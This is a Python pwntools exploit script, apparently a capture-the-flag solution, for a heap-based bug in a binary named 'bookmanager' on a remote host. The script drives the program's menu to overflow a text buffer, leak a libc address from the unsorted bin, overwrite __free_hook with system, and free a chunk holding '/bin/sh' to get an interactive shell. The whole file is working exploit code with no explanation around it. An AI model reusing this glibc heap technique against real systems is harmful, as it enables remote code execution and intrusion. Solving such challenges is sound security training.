#coding=utf-8   
from pwn import *
local = 0
elf=ELF("./bookmanager")
context.terminal=["tmux","splitw","-h"]
if local:
    a=process("./bookmanager")
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    a=remote("47.112.115.30",13337)
    libc=ELF("libc-2.23.so")
def debug():
    gdb.attach(a,'''
    b *()
    ''')
def read_book_name(book_name):
    a.recvuntil("Name of the book you want to create: ")
    a.send(book_name)
def menu(idx):
    a.recvuntil("Your choice:")
    a.sendline(str(idx))
def Add_a_chapter(content):
    menu(1)
    a.recvuntil("Chapter name:")
    a.send(content)
def Add_a_section(chapter,section_name):
    menu(2)
    a.recvuntil("Which chapter do you want to add into:")
    a.send(chapter)
    a.recvuntil("0x")
    heap_addr=eval(a.recvuntil("\n",drop=True))
    a.recvuntil(" name:")
    a.send(section_name)
    return heap_addr
def Add_text(section,size,text):
    menu(3)
    a.recvuntil("Which section do you want to add into:")
    a.send(section)
    a.recvuntil("How many chapters you want to write:")
    a.sendline(str(size))
    a.recvuntil("Text:")
    a.send(text)
def Remove_a_chapter(chapter):
    menu(4)
    a.sendafter("Chapter name:",chapter)
def Remove_a_section(sec): #UAF,section_ptr 没有清NULL
    menu(5)
    a.sendafter("Section name:",sec)
def Remove_text(sec):# 一个section 对应一个text
    menu(6)
    a.sendafter("Section name:",sec)
def show():
    menu(7)

def edit_chapter(chapter_name,new):
    menu(8)
    a.recvuntil("What to update?(Chapter/Section/Text):")
    a.send("Chapter\n")
    a.sendafter("Chapter name:",chapter_name)
    a.sendafter("New Chapter name:",new)
def edit_text(sec,new):
    menu(8)
    a.recvuntil("What to update?(Chapter/Section/Text):")
    a.send("Text\n")
    a.sendafter("Section name:",sec)
    a.sendafter("New Text:",new)

read_book_name("AAAA\n")
Add_a_chapter("chapter_0\n")
heap=Add_a_section("chapter_0\n","chapter_0_sec_0\n")
Add_text("chapter_0_sec_0\n",0x88,'A\n')

Add_a_section("chapter_0\n","chapter_0_sec_1\n")
Add_text("chapter_0_sec_1\n",0x18,'A'+'\n')

Add_a_section("chapter_0\n","chapter_0_sec_2\n")
heap_base=heap-0x130
success("heap_base ==> 0x%x"%heap_base)
Remove_text("chapter_0_sec_0\n")# in unsorted bin
payload='A'*0x18+p64(0x41)+"chapter_0_sec_2".ljust(32,'\x00')+p64(heap_base+0x170)+'\n'
edit_text("chapter_0_sec_1\n",payload)
show()
a.recvuntil("Section:chapter_0_sec_2")
a.recvuntil("Text:")
libc_base=u64(a.recv(6).ljust(8,'\x00'))-libc.symbols["__malloc_hook"]-0x10-88
system_addr=libc_base+libc.symbols["system"]
__free_hook=libc_base+libc.symbols["__free_hook"]
success("libc_base ==> 0x%x"%libc_base)
payload='A'*0x18+p64(0x41)+"chapter_0_sec_2".ljust(32,'\x00')+p64(__free_hook)+'\n'
edit_text("chapter_0_sec_1\n",payload)
edit_text("chapter_0_sec_2",p64(system_addr))
edit_text("chapter_0_sec_1\n","/bin/sh\x00")
Remove_text("chapter_0_sec_1\n")
#debug()
#show()

'''
debug()

Remove_a_section("chapter_0_sec_0\n")
Remove_a_section("chapter_0_sec_1\n")
Remove_a_section("\n")
'''



a.interactive()